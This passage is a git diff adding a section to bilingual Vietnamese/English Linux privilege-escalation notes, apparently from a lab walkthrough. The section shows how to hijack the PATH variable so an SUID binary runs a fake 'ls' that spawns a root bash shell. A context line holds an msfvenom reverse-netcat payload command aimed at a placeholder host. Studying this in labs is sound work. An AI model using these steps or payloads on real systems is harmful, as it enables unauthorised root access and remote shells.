@@ -119,5 +119,34 @@ msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
 
 <h2>Exploiting PATH Variable</h2>
 
-PATH là một biến môi trường trong Linux và Unix sử dụng để chỉ định thư mục chứa các chương trình có thể thực thi.
+PATH là một biến môi trường trong Linux và Unix sử dụng để chỉ định thư mục chứa các chương trình có thể thực thi.\
+view path: `echo $PATH$\`
+>How does this let us escalate privileges?
+
+Let's say we have an SUID binary. Running it, we can see that it’s calling the system shell to do a basic process like list processes with "ps". Unlike in our previous SUID example, in this situation we can't exploit it by supplying an argument for command injection, so what can we do to try and exploit this?
+
+We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead!
+
+As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method we can run whatever commands we like as root!\
+
+VD: Ở đây ta có một file ELF script chạy ls\
+![image](https://user-images.githubusercontent.com/95600382/150497307-e1a3155b-3bfc-4820-8532-8678e8a97fca.png)\
+Giờ chúng ta sẽ đổi thư mục sang `tmp` và tạo một file thực thi với 1 lệnh bất kỳ:\
+echo “[whatever command we want to run]” > [name of the executable we’re imitating]\
+What would the command look like to open a bash shell, writing to a file with the name of the executable we’re imitating\
+`echo "/bin/bash" > ls`\
+![image](https://user-images.githubusercontent.com/95600382/150498303-dedbf0f1-4dbb-4e24-88be-6004429b32b1.png)\
+Sau khi phân quyền cho file chạy, giờ chúng ta phải thay đổi giá trị của biến PATH, ở đây là file nơi script `ls` được lưu trữ. Sử dụng lệnh sau:
+```
+export PATH=/tmp:$PATH
+```
+Note, this will cause you to open a bash prompt every time you use "ls". If you need to use "ls" before you finish the exploit, use "/bin/ls" where the real "ls" executable is.\
+Tiếp đó quay lại màn hình và thực hiện chạy ./scriptm kết quả script đã khởi chạy thành công và nâng quyền lên root:\
+![image](https://user-images.githubusercontent.com/95600382/150499472-30d17488-6d30-488b-b308-348a7d170641.png)\
+Sử dụng về lại mặc định:
+```
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
+```
+để reset biến PATH
+
 
